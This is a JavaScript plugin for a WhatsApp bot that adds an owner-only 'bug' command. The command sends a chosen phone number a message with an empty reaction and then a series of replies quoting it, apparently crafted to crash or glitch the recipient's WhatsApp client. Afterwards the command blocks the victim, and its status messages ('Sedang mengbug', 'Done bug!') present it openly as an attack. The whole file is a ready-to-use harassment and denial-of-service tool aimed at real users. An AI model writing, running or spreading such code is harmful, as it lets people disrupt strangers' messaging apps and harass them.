let handler = async (m, { conn, args }) => {
    //if (!args[0] && !args[1]) return
    let user = m.quoted ? m.quoted.sender : args[0] + '@s.whatsapp.net'
    if (!user) return
    await m.reply('_Sedang mengbug...._')
    let pesn = await conn.reply(user, 'FIERRO', null)
    let pesnn = await conn.sendMessage(user, { react: { text: '', key: pesn.key }})
    await conn.reply(user, '><', pesnn)
    conn.delay(500)
    await conn.reply(user, '><', pesnn)
    conn.delay(500)
    await conn.reply(user, '><', pesnn)
    conn.delay(2000)
    await conn.updateBlockStatus(user, 'block')
    m.reply('Done bug!')
}
handler.help = ['bug']
handler.tags = ['owner']
handler.command = /^(bug)$/i
handler.owner = true

module.exports = handler